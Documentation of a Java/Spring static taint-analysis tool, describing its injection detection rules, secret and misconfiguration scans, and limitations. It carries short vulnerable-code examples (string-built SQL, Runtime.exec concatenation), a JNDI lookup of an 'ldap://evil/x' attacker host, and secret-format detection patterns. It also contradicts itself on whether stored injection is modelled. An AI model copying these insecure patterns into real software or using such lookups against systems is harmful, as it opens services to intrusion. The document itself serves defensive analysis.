# Detection rules

Each rule is a vulnerability category: tainted data reaching a category's **sink**
without passing a **sanitizer**. Sources are framework entry points; sinks and
sanitizers are concrete library methods, configurable in
[`config/spring-taint.yml`](../config/spring-taint.yml).

## Sources (all rules)

External input is taint. Recognized entry points:

| Framework | Annotations / methods |
|---|---|
| Spring MVC / WebFlux | `@RequestParam`, `@PathVariable`, `@RequestBody`, `@RequestHeader`, `@CookieValue`, `@ModelAttribute`, `@MatrixVariable`, `@RequestPart` |
| Spring Kafka | `@KafkaListener` (payload) |
| JAX-RS / Quarkus | `@QueryParam`, `@PathParam`, `@HeaderParam`, `@FormParam`, `@CookieParam` |
| Micronaut | `@QueryValue`, `@PathVariable`, `@Body`, `@Header` |
| Servlet | `HttpServletRequest.getParameter/getHeader/getQueryString`, `ServletRequest/HttpSession.getAttribute` |
| File upload | `MultipartFile.getOriginalFilename/getInputStream/getContentType` |
| Batch | `ItemReader.read` (external CSV/XML/DB data) |
| Persistence | `@Repository` read methods returning `String` (`find*`/`get*`/`read*`/...) |
| Microservices | `@FeignClient` methods returning `String` (data from a downstream service) |
| Scheduled | `@Scheduled` methods are analysis entry points (no request input, but they read external/persisted data internally) |

**Stored / second-order injection.** Data returned by a `@Repository` read method
is treated as untrusted, because an earlier request may have stored attacker input.
This catches cross-request flows (e.g. stored XSS: saved in one request, rendered in
another) that same-request analyzers miss. It is intentionally conservative — any
`@Repository` `String` read that reaches a sink is reported — so it trades some
precision for recall on second-order flows.

The same `String`-only model treats **`@FeignClient` results** as untrusted
(microservice data crossing a service boundary) and covers **`@Transactional`**
write-then-read flows (input persisted and read back in one transaction). Because
**`@Scheduled`** jobs are entry points, these internal sources are analysed even
though such methods take no request input. `String`-only keeps all three precise;
propagating taint through entity/DTO getters (e.g. a Feign `UserDto.getName()`)
would broaden recall at the cost of precision and is intentionally not done.

---

## `sql-injection` — CWE-89 (critical)

Untrusted data concatenated into SQL.

- **Sinks:** `JdbcTemplate.query/update/execute`, `java.sql.Statement.execute/executeQuery`, `EntityManager.createNativeQuery`, R2DBC `DatabaseClient.sql`
- **Sanitizers:** parameterized queries (`NamedParameterJdbcTemplate`, bound `?` parameters) — modelled as not-a-sink
- **Example:** `jdbc.query("… WHERE name = '" + name + "'", mapper)`

## `jpql-injection` — CWE-89 (critical)

Untrusted data concatenated into a JPQL query. Using JPA does **not** make a
string-built query safe.

- **Sinks:** `EntityManager.createQuery(String)`
- **Example:** `em.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")`

## `xss` — CWE-79 (high)

Untrusted data written to an HTTP response without escaping.

- **Sinks:** `PrintWriter.write/print`, `ServletOutputStream.print`
- **Sanitizers:** `HtmlUtils.htmlEscape` (parameter sanitizer)
- **Example:** `response.getWriter().write("<h1>" + name + "</h1>")`

## `ssrf` — CWE-918 (high)

A user-controlled URL is fetched server-side.

- **Sinks:** `RestTemplate.getForObject` (and `WebClient` URL methods)
- **Example:** `restTemplate.getForObject(url, String.class)`

## `spel-injection` — CWE-917 (critical)

A user expression is parsed and evaluated (arbitrary code execution).

- **Sinks:** `ExpressionParser.parseExpression` (and `TemplateAwareExpressionParser`)
- **Example:** `parser.parseExpression(expr).getValue()`

## `path-traversal` — CWE-22 (high)

An untrusted filename builds a filesystem path.

- **Sinks:** `new File(String)`, `Paths.get(String, …)`, `new FileInputStream(String)`
- **Example:** `new File("/data/" + filename)`

## `command-injection` — CWE-78 (critical)

Untrusted data passed to an OS command.

- **Sinks:** `Runtime.exec(String)`, `new ProcessBuilder(String[])`
- **Example:** `Runtime.getRuntime().exec("ping " + host)`

## `open-redirect` — CWE-601 (medium)

A user-controlled URL is used as a redirect target.

- **Sinks:** `HttpServletResponse.sendRedirect`, Spring MVC `ModelAndView.setViewName` (`"redirect:" + url`)
- **Example:** `mv.setViewName("redirect:" + returnUrl)`

## `jndi-injection` — CWE-74 (critical)

A user-controlled name reaches a JNDI lookup, which can load and run remote code —
the mechanism behind Log4Shell (CVE-2021-44228).

- **Sinks:** `Context.lookup`, `InitialContext.lookup`, `InitialDirContext.lookup`
- **Example:** `new InitialContext().lookup(name)  // name = "ldap://evil/x"`

## `xxe` — CWE-611 (high)

External input reaches an XML parser that has not been hardened against external
entities (which can read local files or make server-side requests). The first
version reports any external input reaching `parse`; analysis of the parser's
hardening flags is not yet done, so treat findings as "review the parser config".

- **Sinks:** `DocumentBuilder.parse(String|InputStream|InputSource)`
- **Example:** `documentBuilder.parse(userUri)`

## `template-injection` — CWE-1336 (critical)

A user-controlled template name or body is processed by a template engine, allowing
server-side template injection (often RCE).

- **Sinks:** Thymeleaf `ITemplateEngine.process`, FreeMarker `Configuration.getTemplate`
- **Example:** `templateEngine.process(userPage, context)`

## `log-injection` — CWE-117 (low)

Untrusted data concatenated into a log message can forge log entries (CRLF),
corrupting audit trails. Low severity, but a real integrity issue under PCI-DSS/SOX.

- **Sinks:** the single-argument `org.slf4j.Logger.info/warn/error/debug(String)`
  overloads (the parameterized `"{}"` form is a weaker vector and is not modelled)
- **Example:** `log.info("Login for: " + username)`
- **Note:** logging frameworks log user data internally (e.g. `JdbcTemplate` logs
  the SQL it runs), so sinks reached *inside* the logging facade or other library
  packages are filtered out — only log calls written in application code are reported.

---

## `hardcoded-secret` — CWE-798 (high / critical)

A separate, pattern-based scan of the compiled bytecode (not taint). Run it with
`spring-taint secrets <classes>`. Detects:

- `static final String` constants whose **name** looks like a secret
  (`password`, `secret`, `api[_-]?key`, `token`, `credential`, …) — **high**;
- string literals matching a known **secret format** (AWS `AKIA…`, PEM private
  keys, GitHub `ghp_…`, Slack `xox…`, `sk-…`) — **critical**;
- `@Value("${prop:default}")` whose hardcoded default is a secret.

Reported values are masked. `spring-taint secrets` works on any JDK (it does not
run the taint engine).

## Configuration audit — `spring-taint config <path>`

A pattern-based scan of Spring config files (`application*.yml/.yaml/.properties`,
`bootstrap*`), independent of taint. Point it at a file or a directory:

| Rule | Detects | Severity |
|---|---|---|
| `hardcoded-secret` | a secret-named key (`password`, `secret`, `*-key`, `token`, …) with a **literal** value (not `${ENV}`) | high / critical |
| `insecure-transport` | `server.ssl.enabled: false`; `*.use-insecure-trust-manager: true` | medium / high |
| `security-disabled` | `spring.autoconfigure.exclude` removes `SecurityAutoConfiguration` | high |
| `actuator-exposure` | `management.endpoints.web.exposure.include: "*"`; health `show-details: always` | high / low |
| `h2-console-enabled` | `spring.h2.console.enabled: true`; `web-allow-others: true` | medium / high |

## Misconfiguration scan — `spring-taint misconfig <classes>`

A bytecode pattern scan (any JDK) for insecure Spring code, reported under
`insecure-config`:

- **CSRF disabled** (`csrf().disable()`) — high; **clickjacking defence disabled**
  (`frameOptions().disable()`) — medium;
- **over-permissive CORS** (`@CrossOrigin(origins = "*")`) — medium;
- **insecure cookies** (`setHttpOnly(false)` / `setSecure(false)`) — medium;
- **sensitive data logged** — a password/token/card value (secret-named local,
  field, or getter) passed to a logger — medium.

The Spring Security checks read the lambda DSL (`http.csrf(c -> c.disable())`); the
method-reference form (`AbstractHttpConfigurer::disable`) compiles to
`invokedynamic` and is not matched.

---

## Taint transfers

Taint propagates through method calls via **transfers** (`from` → `to`). Tai-e
bundles ~138 transfers for `String`/`StringBuilder` (concatenation, `substring`,
`trim`, …), which are always loaded. On top of those, the default config adds
transparent wrappers common in modern Spring code:

- `Optional` — `of`/`ofNullable` (arg → wrapper) and `get`/`orElse` (wrapper → out);
- `CompletableFuture` — `completedFuture` and `get`/`join`;
- Reactor `Mono`/`Flux` `just`, and `Collectors.joining` (best-effort).

The unwrap methods return `Object` and are immediately cast in real code
(`Optional<String>` → `String`). Tai-e type-filters at the cast, so the unwrap
transfers declare `type: java.lang.String` to keep the taint flowing across it —
the dominant case, since injection payloads are strings. Operators that take a
lambda (`Mono.map`, `Stream.map`) depend on Tai-e's partial lambda support and are
not relied upon.

## Extending

Add your own sources, sinks, sanitizers and transfers in Tai-e's YAML format and
pass them with `--config` (merged onto the defaults; `--no-default-config` to
replace). Sinks declared on interface library types (no concrete implementation on
the classpath) are matched via Tai-e `call-site-mode`.

## Confidence scores and diff mode

Each taint finding carries a **confidence** (0-100), derived from the call path:
short, lambda-free flows into a concrete injection sink score highest; long or
lambda-bearing paths score lower (and are flagged "review manually" below 50). The
score is shown in the console and written to SARIF as `result.properties.confidence`.

For pull requests, `scan --diff <ref>` (e.g. `--diff origin/main`) reports only
findings whose trace touches a file changed against `<ref>`, using `git diff`. Run
a full scan periodically as well — diff matching is by file, so a flow split across
a changed sink and an unchanged source could be missed.

## Suppressing findings

A finding can be silenced with a documented, in-code reason. Because
`@SuppressWarnings` has source retention (it is not in bytecode), suppression is
comment-based and needs the sources via `--src`:

```java
// spring-taint: suppress sql-injection - table name comes from an internal enum
jdbcTemplate.execute("SELECT * FROM " + table.getValue());
```

The comment may sit on the flagged line or the line directly above it; use `*` as
the rule to suppress any finding on the line. `scan --src <dir>` then drops matching
findings (and reports how many). `spring-taint suppressions <dir>` lists every
directive so they can be audited.

## Validating a custom config

`spring-taint validate-config [config.yml] --classpath <cp>` resolves every method
signature in the config against a classpath and reports any that do not exist — a
typo'd signature silently matches nothing, which otherwise looks like "no
vulnerabilities" rather than "rule never ran".

## Known limitations

- The reported trace is the shortest **call path** from source to sink (control
  flow); a value that detours through a side method may not appear as a hop.
  Exact data-flow traces require Tai-e to expose its taint flow graph.
- Reflection, dynamic proxies (Spring AOP/CGLib) and cross-request stored
  injection are not modelled.
- The analysis runs on **JDK 17** (Tai-e 0.5.1 does not read JDK 21 bytecode).
